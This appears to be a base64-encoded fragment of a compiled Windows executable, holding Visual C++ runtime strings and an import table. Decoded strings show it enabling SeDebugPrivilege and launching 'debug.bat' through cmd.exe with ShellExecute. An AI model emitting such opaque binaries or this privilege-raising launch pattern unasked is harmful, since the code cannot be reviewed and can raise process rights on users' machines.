kAAAAAAE1NL2RkL3l5AAAAAFBNAABBTQAAAAAAAERlY2VtYmVyAAAAAAAAAABOb3ZlbWJlcgAAAAAAAAAAT2N0b2JlcgBTZXB0ZW1iZXIAAABBdWd1c3QAAEp1bHkAAAAASnVuZQAAAABBcHJpbAAAAE1hcmNoAAAAAAAAAEZlYnJ1YXJ5AAAAAAAAAABKYW51YXJ5AERlYwBOb3YAT2N0AFNlcABBdWcASnVsAEp1bgBNYXkAQXByAE1hcgBGZWIASmFuAFNhdHVyZGF5AAAAAEZyaWRheQAAAAAAAFRodXJzZGF5AAAAAAAAAABXZWRuZXNkYXkAAAAAAAAAVHVlc2RheQBNb25kYXkAAFN1bmRheQAAU2F0AEZyaQBUaHUAV2VkAFR1ZQBNb24AU3VuAAAAAAByAHUAbgB0AGkAbQBlACAAZQByAHIAbwByACAAAAAAAA0ACgAAAAAAVABMAE8AUwBTACAAZQByAHIAbwByAA0ACgAAAAAAAABTAEkATgBHACAAZQByAHIAbwByAA0ACgAAAAAAAAAAAEQATwBNAEEASQBOACAAZQByAHIAbwByAA0ACgAAAAAAAAAAAAAAAABSADYAMAAzADMADQAKAC0AIABBAHQAdABlAG0AcAB0ACAAdABvACAAdQBzAGUAIABNAFMASQBMACAAYwBvAGQAZQAgAGYAcgBvAG0AIAB0AGgAaQBzACAAYQBzAHMAZQBtAGIAbAB5ACAAZAB1AHIAaQBuAGcAIABuAGEAdABpAHYAZQAgAGMAbwBkAGUAIABpAG4AaQB0AGkAYQBsAGkAegBhAHQAaQBvAG4ACgBUAGgAaQBzACAAaQBuAGQAaQBjAGEAdABlAHMAIABhACAAYgB1AGcAIABpAG4AIAB5AG8AdQByACAAYQBwAHAAbABpAGMAYQB0AGkAbwBuAC4AIABJAHQAIABpAHMAIABtAG8AcwB0ACAAbABpAGsAZQBsAHkAIAB0AGgAZQAgAHIAZQBzAHUAbAB0ACAAbwBmACAAYwBhAGwAbABpAG4AZwAgAGEAbgAgAE0AUwBJAEwALQBjAG8AbQBwAGkAbABlAGQAIAAoAC8AYwBsAHIAKQAgAGYAdQBuAGMAdABpAG8AbgAgAGYAcgBvAG0AIABhACAAbgBhAHQAaQB2AGUAIABjAG8AbgBzAHQAcgB1AGMAdABvAHIAIABvAHIAIABmAHIAbwBtACAARABsAGwATQBhAGkAbgAuAA0ACgAAAAAAUgA2ADAAMwAyAA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAbABvAGMAYQBsAGUAIABpAG4AZgBvAHIAbQBhAHQAaQBvAG4ADQAKAAAAAAAAAAAAAAAAAFIANgAwADMAMQANAAoALQAgAEEAdAB0AGUAbQBwAHQAIAB0AG8AIABpAG4AaQB0AGkAYQBsAGkAegBlACAAdABoAGUAIABDAFIAVAAgAG0AbwByAGUAIAB0AGgAYQBuACAAbwBuAGMAZQAuAAoAVABoAGkAcwAgAGkAbgBkAGkAYwBhAHQAZQBzACAAYQAgAGIAdQBnACAAaQBuACAAeQBvAHUAcgAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAuAA0ACgAAAAAAUgA2ADAAMwAwAA0ACgAtACAAQwBSAFQAIABuAG8AdAAgAGkAbgBpAHQAaQBhAGwAaQB6AGUAZAANAAoAAAAAAAAAAAAAAAAAUgA2ADAAMgA4AA0ACgAtACAAdQBuAGEAYgBsAGUAIAB0AG8AIABpAG4AaQB0AGkAYQBsAGkAegBlACAAaABlAGEAcAANAAoAAAAAAAAAAABSADYAMAAyADcADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABsAG8AdwBpAG8AIABpAG4AaQB0AGkAYQBsAGkAegBhAHQAaQBvAG4ADQAKAAAAAAAAAAAAUgA2ADAAMgA2AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAcwB0AGQAaQBvACAAaQBuAGkAdABpAGEAbABpAHoAYQB0AGkAbwBuAA0ACgAAAAAAAAAAAFIANgAwADIANQANAAoALQAgAHAAdQByAGUAIAB2AGkAcgB0AHUAYQBsACAAZgB1AG4AYwB0AGkAbwBuACAAYwBhAGwAbAANAAoAAAAAAAAAUgA2ADAAMgA0AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAXwBvAG4AZQB4AGkAdAAvAGEAdABlAH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MgQXJyYXknAAAAAAAAIEJhc2UgQ2xhc3MgRGVzY3JpcHRvciBhdCAoAAAAAAAgVHlwZSBEZXNjcmlwdG9yJwAAAAAAAABgbG9jYWwgc3RhdGljIHRocmVhZCBndWFyZCcAAAAAAGBtYW5hZ2VkIHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAAAAAGB2ZWN0b3IgdmJhc2UgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAAAAAGB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAABgZHluYW1pYyBhdGV4aXQgZGVzdHJ1Y3RvciBmb3IgJwAAAAAAAAAAYGR5bmFtaWMgaW5pdGlhbGl6ZXIgZm9yICcAAAAAAABgZWggdmVjdG9yIHZiYXNlIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAABgZWggdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYG1hbmFnZWQgdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAAAAAGBtYW5hZ2VkIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgcGxhY2VtZW50IGRlbGV0ZVtdIGNsb3N1cmUnAAAAAGBwbGFjZW1lbnQgZGVsZXRlIGNsb3N1cmUnAAAAAAAAYG9tbmkgY2FsbHNpZycAACBkZWxldGVbXQAAACBuZXdbXQAAAAAAAGBsb2NhbCB2ZnRhYmxlIGNvbnN0cnVjdG9yIGNsb3N1cmUnAAAAAABgbG9jYWwgdmZ0YWJsZScAYFJUVEkAAABgRUgAAAAAAGB1ZHQgcmV0dXJuaW5nJwBgY29weSBjb25zdHJ1Y3RvciBjbG9zdXJlJwAAAAAAAGBlaCB2ZWN0b3IgdmJhc2UgY29uc3RydWN0b3IgaXRlcmF0b3InAABgZWggdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAGBlaCB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAAAAAABgdmlydHVhbCBkaXNwbGFjZW1lbnQgbWFwJwAAAAAAAGB2ZWN0b3IgdmJhc2UgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAABgdmVjdG9yIGRlc3RydW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lvbkVudHJ5AAAYBFJ0bENhcHR1cmVDb250ZXh0ACUEUnRsVW53aW5kRXgA7gBFbmNvZGVQb2ludGVyAFoBRmxzR2V0VmFsdWUAWQFGbHNGcmVlAIAEU2V0TGFzdEVycm9yAAAIAkdldExhc3RFcnJvcgAAWAFGbHNBbGxvYwAA1wJIZWFwRnJlZQAATAJHZXRQcm9jQWRkcmVzcwAAHgJHZXRNb2R1bGVIYW5kbGVXAAAfAUV4aXRQcm9jZXNzAMsARGVjb2RlUG9pbnRlcgB8BFNldEhhbmRsZUNvdW50AABrAkdldFN0ZEhhbmRsZQAA6wJJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uQW5kU3BpbkNvdW50APoBR2V0RmlsZVR5cGUAagJHZXRTdGFydHVwSW5mb1cA0gBEZWxldGVDcml0aWNhbFNlY3Rpb24AGQJHZXRNb2R1bGVGaWxlTmFtZUEAAGcBRnJlZUVudmlyb25tZW50U3RyaW5nc1cAIAVXaWRlQ2hhclRvTXVsdGlCeXRlAOEBR2V0RW52aXJvbm1lbnRTdHJpbmdzVwAA2wJIZWFwU2V0SW5mb3JtYXRpb24AAKoCR2V0VmVyc2lvbgAA1QJIZWFwQ3JlYXRlAADWAkhlYXBEZXN0cm95AKkDUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIAmgJHZXRUaWNrQ291bnQAAMcBR2V0Q3VycmVudFByb2Nlc3NJZACAAkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lANMCSGVhcEFsbG9jALQDUmFpc2VFeGNlcHRpb24AACEEUnRsUGNUb0ZpbGVIZWFkZXIAOwNMZWF2ZUNyaXRpY2FsU2VjdGlvbgAA8gBFbnRlckNyaXRpY2FsU2VjdGlvbgAAeAFHZXRDUEluZm8AbgFHZXRBQ1AAAD4CR2V0T0VNQ1AAAAwDSXNWYWxpZENvZGVQYWdlANoCSGVhcFJlQWxsb2MAQQNMb2FkTGlicmFyeVcAADQFV3JpdGVGaWxlABoCR2V0TW9kdWxlRmlsZU5hbWVXAADcAkhlYXBTaXplAAAvA0xDTWFwU3RyaW5nVwAAaQNNdWx0aUJ5dGVUb1dpZGVDaGFyAHACR2V0U3RyaW5nVHlwZVcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA